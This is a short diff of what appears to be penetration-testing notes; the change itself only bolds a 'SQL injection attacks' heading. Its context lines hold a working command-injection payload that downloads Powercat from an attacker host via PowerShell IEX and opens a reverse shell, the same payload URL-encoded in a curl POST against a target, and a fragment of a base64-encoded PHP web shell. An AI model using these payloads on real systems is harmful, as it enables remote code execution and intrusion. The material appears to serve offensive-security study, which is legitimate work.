@@ -298,7 +298,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     7. Download Powercat and create a reverse shell via command injection
        `Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell`  > send encoding payload  
        `kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<kali>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<kali>%20-p%204444%20-e%20powershell' http://<target>:8000/archive`  
-- SQL injection attacks
+- **SQL injection attacks**
   
 # Reverse shell
 - Kali listener
